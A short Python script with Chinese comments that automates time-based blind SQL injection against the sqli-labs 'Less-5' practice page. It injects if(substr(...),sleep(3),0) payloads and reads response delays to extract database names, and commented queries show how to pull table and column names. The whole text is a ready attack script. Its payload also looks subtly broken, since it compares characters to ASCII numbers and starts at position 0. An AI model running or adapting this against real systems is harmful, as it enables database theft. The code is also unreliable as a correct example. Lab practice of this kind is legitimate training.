```javascript
#coding=utf-8
# python3
# author: leticia
import requests
#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'

#需要匹配的字符
dic='0123456789abcdefghijklmnopqrstuvwxyz,'

#注入点
url="http://127.0.0.1/sql-labs/Less-5/?id=1' and "
string=''
for i in range(100):
    for j in dic:

        #注入语句
        #format()函数将函数中的内容放入{}中
        id="if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}),sleep(3),0)--+".format(str(i),ascii(j))
        #print(id)
        url_get=(url+id)
        #print(url_get)
        r=requests.get(url_get)
        sec=r.elapsed.seconds

        #如果返回响应时间大于2就输出
        if sec > 2:
            string+=j
            print(string)
            break
print(string)
```

